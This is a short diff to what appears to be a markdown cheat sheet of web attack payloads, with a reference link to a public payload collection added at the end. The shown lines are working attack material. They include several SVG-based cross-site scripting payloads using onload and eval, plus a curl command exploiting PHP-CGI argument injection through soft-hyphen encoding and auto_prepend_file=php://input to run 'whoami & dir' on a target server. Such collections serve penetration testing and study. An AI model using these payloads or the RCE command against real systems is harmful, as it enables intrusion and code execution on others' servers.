@@ -153,7 +153,6 @@
       <svg id=alert(1) onload=eval(id)>
       "><svg/onload=alert(String.fromCharCode(88,83,83))>
       "><svg/onload=alert(/XSS/)
-      <svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
       <svg><script>alert('33')
       <svg><script>alert&lpar;'33'&rpar;
       
@@ -177,5 +176,5 @@
     ```sh
     curl -o - "URL/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" --data '<?=`whoami & dir`;die();?>'
     ```
-
-
+## RF&一堆教材文件
+ - https://github.com/swisskyrepo/PayloadsAllTheThings
